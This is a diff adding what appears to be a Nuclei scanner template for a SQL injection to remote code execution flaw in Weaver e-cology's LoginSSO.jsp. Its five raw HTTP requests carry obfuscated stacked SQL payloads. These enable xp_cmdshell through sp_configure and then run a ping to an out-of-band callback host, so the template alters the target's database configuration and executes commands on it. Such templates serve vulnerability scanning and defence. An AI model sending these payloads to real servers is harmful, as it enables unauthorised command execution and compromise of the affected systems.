@@ -1,0 +1,41 @@
+id: fanwei-ecology-loginsso-rce
+
+info:
+  name: fanwei-ecology-loginsso-rce
+  author: fanwei-ecology-loginsso-rce
+
+http:
+  - raw:
+      - |
+        GET /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mailid=0&mrfuuid=1';execute%28%27exe%27%2B%27c%20sp%27%2B%27_config%27%2B%27ure%20%27%27show%20advanced%20options%27%27%2C%201%3B%27%29--+&a=.swf HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5625.194 Safari/537.36
+
+      - |
+        GET /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mailid=0&mrfuuid=1';execute%28%27reconfigure%27%29--+&a=.swf HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5625.194 Safari/537.36
+
+      - |
+        GET /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mailid=0&mrfuuid=1';execute%28%27exe%27%2B%27c%20sp%27%2B%27_config%27%2B%27ure%20%27%27xp_c%27%2B%27mdshell%27%27%2C%201%3B%27%29--+&a=.swf HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5625.194 Safari/537.36
+      
+      - |
+        GET /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mailid=0&mrfuuid=1';execute%28%27reconfigure%27%29--+&a=.swf HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5625.194 Safari/537.36
+
+      - |
+        GET /weaver/FileDownloadLocation/login/LoginSSO.%2520jsp?ddcode=7ea7ef3c41d67297&mailid=0&mrfuuid=1';execute%28%27exe%27%2B%27c%20xp_cm%27%2B%27dshell%20%27%27ping%20-c%201%20{{interactsh-url}}%27%27%27%29--+&a=.swf HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5625.194 Safari/537.36
+    
+    cookie-reuse: true
+    matchers:
+      - type: word
+        name: dnslog
+        part: interactsh_protocol
+        words:
+          - "dns"
+
